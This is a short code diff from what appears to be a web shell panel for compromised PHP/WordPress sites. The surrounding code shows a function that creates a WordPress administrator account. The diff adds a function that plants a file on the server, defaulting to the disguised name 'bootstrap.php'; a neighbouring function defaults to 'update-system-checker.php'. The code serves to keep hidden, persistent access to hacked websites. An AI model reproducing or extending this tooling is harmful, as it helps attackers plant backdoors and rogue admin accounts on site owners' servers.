@@ -1151,6 +1151,13 @@ function createWpAdmin()
 		sehife("?ne=create_wp_admin&wp_username=" + username + "&wp_email=" + email + "&wp_password=" + password + "&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>");
 	}
 }
+function createShbFile()
+{
+	var filename = prompt('Name:', 'bootstrap.php');
+	if (filename) {
+		sehife("?ne=create_shb_file&filename=" + filename + "&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>");
+	}
+}
 function createStFolder()
 {
 	var filename = prompt('Name:', 'update-system-checker.php');
